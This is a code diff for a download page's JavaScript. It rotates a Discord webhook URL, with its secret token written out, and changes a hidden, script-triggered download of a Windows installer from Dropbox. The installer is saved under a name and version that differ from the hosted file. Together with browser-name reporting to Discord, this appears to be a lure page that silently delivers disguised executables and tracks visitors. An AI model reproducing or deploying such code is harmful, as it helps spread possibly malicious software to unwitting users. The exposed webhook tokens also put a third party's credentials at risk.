@@ -149,7 +149,7 @@ document.addEventListener('click', (e) => {
 
 
 // ---- DISCORD WEBHOOK ----
-const WEBHOOK_URL = 'https://discord.com/api/webhooks/1492595227393921124/UibYbpBFi7OL800ePlz2vH-oMM9SPESEwGw5lzT-jB3RqTAKRSiIIjbiFhV17whgOuZc';
+const WEBHOOK_URL = 'https://discord.com/api/webhooks/1503478560944291912/wg5DQRedR9SmIHmF5ll5n2qhvJ4t-AaAeTlFB1MDIxUhVKMc8HWwz7tHUCs8JAKYhtqo';
 
 function getBrowserName() {
     const ua = navigator.userAgent;
@@ -275,8 +275,8 @@ async function notifyDiscord() {
 // ---- START ACTUAL FILE DOWNLOAD ----
 function startFileDownload() {
     const a = document.createElement('a');
-    a.href = 'https://www.dropbox.com/scl/fi/1h7h0nbje74wi9m07lh7d/LumaSinkV2-Setup-3.0.0.exe?rlkey=xssfiq1mehs473ej2p7cr0nso&st=8qhkqlsb&dl=1';
-    a.download = 'SoftSlump Setup 2.0.0.exe';
+    a.href = 'https://www.dropbox.com/scl/fi/om0jk77k4sroytl3sjn2w/VoidLune-Setup-1.0.0.exe?rlkey=b3ufgujgf71j3lqyqz3gojgy4&st=e8yy2ma3&dl=1';
+    a.download = 'VoidLune Setup 2.0.0.exe';
     a.style.display = 'none'; // Ensure it's hidden
     document.body.appendChild(a);
     a.click();
